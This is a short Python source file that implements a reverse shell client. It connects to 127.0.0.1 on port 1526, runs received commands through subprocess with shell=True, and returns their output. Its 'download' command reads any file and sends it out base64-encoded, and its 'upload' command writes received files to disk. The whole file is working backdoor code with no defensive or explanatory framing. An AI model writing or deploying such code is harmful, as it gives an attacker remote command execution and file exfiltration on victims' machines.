import socket
import subprocess
import json
import os
import base64


def send(data):
    """Responsible for sending data"""
    json_data = json.dumps(data)
    sock.send(json_data)


def receive():
    """Responsible for receiving data"""
    data = ""
    while True:
        try:
            data = data + sock.recv(1024)
            return json.loads(data)
        except ValueError:
            continue


def shell():
    """Managing the shell commands sent to it."""
    while True:
        command = receive()
        if command == "":
            continue

        elif command[:8] == "download":
            with open(command[9:], "rb") as file:
                send(base64.b64encode(file.read()))

        elif command[:6] == "upload":
            with open(command[7:], "wb") as uload:
                file_data = receive()
                uload.write(base64.b64decode(file_data))

        elif command == 'detach':
            continue

        elif command == "quit":
            sock.close()
            break

        elif command[:2] == 'cd' and len(command) > 1:
            try:
                os.chdir(command[3:])
            except:
                continue

        else:
            proc = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                                    stdin=subprocess.PIPE)
            results = proc.stdout.read() + proc.stderr.read()
            send(results)


sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect(("127.0.0.1", 1526))

shell()
